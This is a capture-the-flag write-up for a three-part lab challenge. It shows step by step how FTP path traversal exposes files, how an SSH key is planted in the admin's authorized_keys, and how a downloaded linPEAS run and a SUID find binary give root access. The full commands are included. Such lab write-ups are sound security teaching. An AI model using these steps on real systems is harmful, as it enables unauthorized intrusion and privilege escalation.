# Unlock The City 2022 - Phase 1 - Factory Reset
*This challenge was developed by DHaines@DeloitteNL*

## Challenge information

> In the haunted factory, which once was a masterpiece before the AI took over, lies many secrets. Can you find them all to gain control over the havoc?
> Note: the target system is running on 10.6.0.100 

The challenge has 3 subtasks for a total of 300 points.


## First part - NO LIMITS

### Flag information
> We are bound to our limits, the AI wasn't. Can you go beyond the limit searching for the stolen data?

We are given the IP of the target machine.
Running nmap on it we can see what ports are open

```
➜  ~ nmap 10.6.0.100
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-01 22:18 CEST
Nmap scan report for 10.6.0.100
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.99 seconds
```

We see that two ports are open 21 ftp and 22 ssh.

If we try to access the SSH port we are greeted with a password login but we can access the FTP port.

The FTP server has anonymous login enabled so we can enter any username and password combination we like.

We can run:
```
ftp user:user@10.6.0.100 21
```

We are treated with 3 non interesting files:
```
ftp> ls
200 PORT command successful.
150 Data connection opened; transfer starting.
-rw-r--r-- 1     0     0          220 May  9 21:46 .bash_logout
-rw-r--r-- 1     0     0         3771 May  9 21:46 .bashrc
-rw-r--r-- 1     0     0          807 May  9 21:46 .profile
226 Transfer complete.
```

The only way to progress to finish this stage is to try doing path traversal with ls.
So something like this will list the root of the drive.
```
ls ../../
```

After exploring the file system for a while you might find two interesting things:

By executing this command you will find the home directory of the admin user.
In here we can spot the bash history of the admin user!
We can see it by running this command:
```
get ../admin/.bash_history <path here>/hist.txt
```

The bash history contains the following lines:

```
uftpd -o ftp=21
ps | grep ftp
ftp localhost
ls -la
exit
uftpd -o ftp=21
ifconfog
exit
ifconfig
uftpd -o ftp=21
ps
ps -aux
ls
cd home
ls
cd admin
ls
ls -la
mkdir.ssh
mkdir .ssh
chmod 700 .ssh
exit
sudo setcap cap_net_bind_service+ep /usr/local/sbin/uftpd 
exit
sudo setcap cap_net_bind_service+ep /usr/local/sbin/uftpd 
tty

exit
ls
cd /home
uftpd -o port=21
uftpd -o ftp=21
uftpd -
uftpd -o ftp=21 -n
adduser ftp
sudo adduser ftp
exit
cd admin
cd /home/admin
ls
uftpd -o port=21 -n
uftpd -o ftp=21 -n
uftpd -o ftp=21
ps
ps kill -9 244
kill -9 244
ps -aux
kill -9 247
ps
ps -aux
exit
uftpd -o ftp=21 -n
exit
ps -aux
uftpd -o ftp=21
exit
ls
cd /home
ls
cd admin
dir
ls -la
uftpd -o ftp=21
cd /var
ls
cd backups
ls
ls -la
mkdir data
exit
whoami
exit
find . -exec /bin/bash -p \; -quit
find . -exec /bin/sh -p \; -quit
exit
vi /etc/ssh/sshd_config
exit
uftpd -o ftp=21
cd /tmp
ls
rm *
exit
ls
exit
```

This bash history tells use multiple things most important being that:
1. The .ssh folder inside /home/admin has write permissions which might be helpful in the future.
2. That there is a folder backups inside /var directory with some interesting data.


By running the following command we seem to have found the file containing the first flag:
```
ls ../../var/backups/DATA

-rw-r--r-- 1     0     0           23 May 10 09:12 flag1.txt
```

To retrieve the file we can execute something like:
```
get ../../var/backups/DATA/flag1.txt <path here>/flag1.txt
```

## We have found the first flag
>CTF{F0rtREss_Br3@c#3d}

<br><br>

## Second part - SAFE ZONE

### Flag information
> There are no roads. The only way you can walk is to break the wall..... and gain access.

We probably need to do something with that .ssh folder in order to gain access to the ssh port.

We need to check the configuration files of the ssh server.
Looking at the bash history we can see that it mentions the path of ssh config and by executing the following command we can retrieve it.

```
get ../../etc/ssh/sshd_config <path here>/sshd_config
```

The file contains the following relevant line:
```
#AuthorizedKeysFile	.ssh/authorized_keys .ssh/authorized_keys2
```
We can see the authentication for the ssh server is done using keys and the authorized keys are located in our special .ssh folder.

All we need to do is upload our own ssh key and we are in!

We can generate such a key by running the following command:
```
ssh-keygen -t rsa -f ./id_rsa
```

After generating it we can just place our public ssh key inside the .ssh folder
```
put ./id_rsa.pub ../admin/.ssh/authorized_keys
```

### We can now just login with our private key
>Note:  We need to enter the passsphrase we used during the key generation process and we need to login using the admin account.

```
➜  Desktop ssh -i ./id_rsa 10.6.0.100 -l admin
Enter passphrase for key './id_rsa':
##############################################################################
	Welcome to the hackers paradise - You were awesome
	Here is your mysterious flag - CTF{Th3_Inc3pt0r}
#############################################################################
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@701ee3dfcc4c:~$
```

We are now in and we are treated with the second flag!

>CTF{Th3_Inc3pt0r}

## Third part - MASTER

### Flag information
> Dig little deeper to take the control back from the AI. You will find out what you need only when you know who you are.

We just gained access to the ssh server. The only problem is that we aren't root and we don't know the password to gain access.

As we search around the file system we can find our next target.

The root folder needs elevated permissions to be accessed.

This is probably a non conventional approach but we decided to run linPEAS on it. We got this idea from another challenge found in this CTF (Protect the supply). You can find our write up on this challenge [here](protectthesupply.md).

To learn more about linPEAS visit here: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

For short it's a script that checks for multiple options of doing privilige escalation on linux.

We can upload the script using ftp to the .ssh folder by running:
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh

put ./linpeas.sh ../admin/.ssh/linpeas.sh
```

We can now just cd into the folder inside ssh.
In order to run the script we need to first run the following command:
```
chmod 700 linpeas.sh
```
After this we can just run it as normal.

The output of linpeas is huge but using the color coded severity flags we can see that it has found a vulnerability present inside the find utility
```
-rwsr-sr-x 1 root root 233K Nov  5  2017 /usr/bin/find
```
More exactly find actually runs as root!

We can easily exploit this to find what the root folder contains!
```
find / -type f -exec ls "/root/" \;
```
This command does an LS as root and we can see that the file ``final.txt`` is present.
We can now run the following command to see the contents:

```
find / -type f -exec cat "/root/final.txt" \;
CTF{!_@m_r00t3d}
```

We have now found the third and final flag of the challenge!

>CTF{!_@m_r00t3d}

This was one of the best challenges of the whole set!